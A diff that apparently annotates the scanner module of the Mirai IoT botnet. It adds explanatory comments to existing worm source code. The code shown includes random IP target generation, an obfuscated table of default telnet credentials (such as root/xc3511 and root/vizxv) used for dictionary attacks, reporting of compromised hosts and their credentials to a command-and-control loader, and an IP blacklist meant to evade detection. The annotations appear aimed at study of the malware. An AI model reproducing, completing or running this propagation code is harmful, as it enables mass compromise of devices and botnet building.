@@ -54,7 +54,7 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
-void scanner_init(void)
+void scanner_init(void)			//Scanner is responsible for finding other targets to infect and attempting to infect them, it randomly generates IP addresses to scan and tries a dictionary attack to gain access
 {
     int i;
     uint16_t source_port;
@@ -62,7 +62,7 @@ void scanner_init(void)
     struct tcphdr *tcph;
 
     // Let parent continue on main thread
-    scanner_pid = fork();
+    scanner_pid = fork(); 			//Create child process to stay in scanner_init(), parent process returns to main(), save child pid so that child can be killed if needed in the future        
     if (scanner_pid > 0 || scanner_pid == -1)
         return;
 
@@ -120,7 +120,7 @@ void scanner_init(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords
+    // Set up passwords			//username, password combos that are decoded into a table for use by the scanner, the int is a weight used to denote that order that key pairs are checked against the target
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -446,7 +446,7 @@ void scanner_init(void)
                     {
                         int consumed = 0;
 
-                        switch (conn->state)
+                        switch (conn->state)		//Switch creates a ladder that is traversed as the scanner attempts to connect to a target host
                         {
                         case SC_HANDLE_IACS:
                             if ((consumed = consume_iacs(conn)) > 0)
@@ -609,7 +609,7 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                report_working(conn->dst_addr, conn->dst_port, conn->auth);		//If a valid host is found and a connection can be established the scanner sends a report to the loader (C2) server with the IP and credentialls of target host
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
@@ -685,7 +685,7 @@ static ipv4_t get_random_ip(void)
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
     }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback				//Blacklists scanning specific IP addresses, some are invalid addresses, some could result in the detection of the botnet
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
@@ -873,7 +873,7 @@ static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
     int tmp;
 
     auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
-    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
+    auth_table[auth_table_len].username = deobf(enc_user, &tmp);		//deobf is deobfsucate, takes the hex and returns string whilst changing tmp to the length of the string
     auth_table[auth_table_len].username_len = (uint8_t)tmp;
     auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
     auth_table[auth_table_len].password_len = (uint8_t)tmp;
@@ -882,7 +882,7 @@ static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
     auth_table_max_weight += weight;
 }
 
-static struct scanner_auth *random_auth_entry(void)
+static struct scanner_auth *random_auth_entry(void)		//Randomly chooses a username/password pair to try against the target, the weights make it more likely that certain pairs get tested than others
 {
     int i;
     uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);
